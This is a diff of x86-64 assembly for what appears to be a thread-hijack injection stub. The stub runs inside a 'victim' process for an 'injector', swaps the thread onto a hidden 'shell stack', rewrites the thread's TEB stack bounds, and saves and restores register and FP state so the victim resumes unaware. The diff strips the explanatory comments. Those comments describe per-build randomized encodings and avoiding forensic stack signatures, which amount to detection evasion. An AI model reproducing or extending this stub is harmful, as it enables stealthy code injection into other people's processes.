@@ -23,10 +23,6 @@ STUB_SEED EQU AMEGER_STUB_SEED
 ELSE
 .ERR <AMEGER_STUB_SEED must be provided by the build (randomized per build)>
 ENDIF
-;; STUB_SEED only steers encoding choices. It must never select between semantically
-;; different instructions: STUB_FP_ADDR picks between two equivalent ways of forming
-;; the FP area address, and STUB_RSP_CAPTURE picks between two equivalent ways of
-;; reading RSP. Both are pure diversification.
 STUB_FP_ADDR     EQU (STUB_SEED AND 1)
 STUB_RSP_CAPTURE EQU (STUB_SEED AND 4)
 
@@ -57,10 +53,6 @@ ELSE
 ENDIF
     mov [rbx+SR_SAVED_RSP], r12
 
-    ;; A5: pivot onto the dedicated shell stack before anything else runs. The
-    ;; victim's free stack is never zero-filled, so no zero-run or entropy
-    ;; signature is left behind; only the 17 push slots below the victim RSP
-    ;; are written, and they hold the victim's own register values.
 IF STUB_RSP_CAPTURE
     lea rsp, [rbx + SR_SHELL_STACK_TOP]
 ELSE
@@ -70,14 +62,6 @@ ELSE
 ENDIF
     mov r10, rsp
     mov [rbx+SR_SHELL_RSP], r10
-    ;; A9: publish the shell stack as this thread's stack while the routine
-    ;; runs. The pivot changed RSP but the TEB still describes the victim's
-    ;; stack, so every consumer of the TEB bounds - __chkstk in large frames,
-    ;; the exception dispatcher's exhaustion evaluation, any first-chance
-    ;; handler in the target - judged stack state against a region this
-    ;; thread is no longer running on. Measured 2026-10-25: the target exited
-    ;; with STATUS_STACK_OVERFLOW (0xC00000FD) mid-shell until the bounds
-    ;; followed the pivot.
     mov r10, gs:[08h]
     mov [rbx+SR_SAVED_STACKBASE], r10
     mov r10, gs:[10h]
@@ -86,8 +70,6 @@ ENDIF
     mov gs:[08h], r10
     lea r10, [rbx + SR_SHELL_STACK_BASE]
     mov gs:[10h], r10
-    ;; Caller-owned shadow space for the routine being called. RSP is
-    ;; 16-byte aligned here, so the call leaves the callee at 8 mod 16.
     sub rsp, 20h
 
 IF STUB_FP_ADDR
@@ -98,23 +80,15 @@ ELSE
 ENDIF
     cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
     jne StubFpSaveFallback
-    ;; XGETBV reads the XCR0 of whichever thread executes this stub, so the mask is
-    ;; derived from the victim's own XCR0 and never from the injector's. The value the
-    ;; injector staged in SR_FP_MASK is the CPU capability ceiling; the intersection
-    ;; of the two is what is legal to request (anything else raises #GP).
     xor ecx, ecx
     xgetbv
     and eax, SR_FP_XCR0_MASK
     and eax, dword ptr [rbx+SR_FP_MASK]
     mov dword ptr [rbx+SR_FP_MASK], eax
     xor edx, edx
-    ;; xsave64 (REX.W) is the only form that captures the full 256-bit XMM/YMM state.
     xsave64 [r10]
     jmp StubFpSaveDone
 StubFpSaveFallback:
-    ;; No XSAVE on this CPU: FXSAVE64 still captures the full XMM registers. The YMM
-    ;; upper halves cannot be captured by FXSAVE at all, but the stub never writes them
-    ;; either, so they pass through untouched.
     fxsave64 [r10]
 StubFpSaveDone:
 
@@ -164,9 +138,6 @@ ELSE
 ENDIF
     cmp dword ptr [rbx+SR_FP_FLAGS], SR_FP_FLAG_XSAVE
     jne StubFpRestoreFallback
-    ;; Reuse the mask the save phase actually used (it was narrowed against the
-    ;; victim's XCR0 there); restoring with a different mask would fault or leave the
-    ;; saved components unrestored.
     mov eax, dword ptr [rbx+SR_FP_MASK]
     xor edx, edx
     xrstor64 [r10]
@@ -175,9 +146,6 @@ StubFpRestoreFallback:
     fxrstor64 [r10]
 StubFpRestoreDone:
 
-    ;; A9: the victim's own stack bounds go back before anything returns to
-    ;; the victim's frame; the restore is placed with the other state-page
-    ;; reads, ahead of the pops that reload the victim registers.
     mov r10, [rbx+SR_SAVED_STACKBASE]
     mov gs:[08h], r10
     mov r10, [rbx+SR_SAVED_STACKLIMIT]
@@ -189,10 +157,6 @@ StubFpRestoreDone:
 
 
 
-    ;; A5: no victim-stack scrub. The only bytes written below the victim RSP
-    ;; are the 17 push slots at the top of this stub, and they hold the victim's
-    ;; own register values. The shell stack is zeroed by the allocator and is
-    ;; wiped by the host before this allocation is released or freed.
     mov rsp, r12
     pop r15
     pop r14
@@ -205,10 +169,6 @@ StubFpRestoreDone:
     pop rdi
     pop rsi
     pop rbp
-;; Publish the exit sentinel while RBX still addresses the state page; the trailing pops
-;; would otherwise restore the victim RBX first. The return jump still reads the target
-;; from the state page and the host reclaims the trampoline only once RIP has left the
-;; RX code page, so the store must happen before RBX is consumed by the pops.
     mov qword ptr [rbx+SR_STATE], SR_STATE_EXITED
     pop rbx
     pop rdx
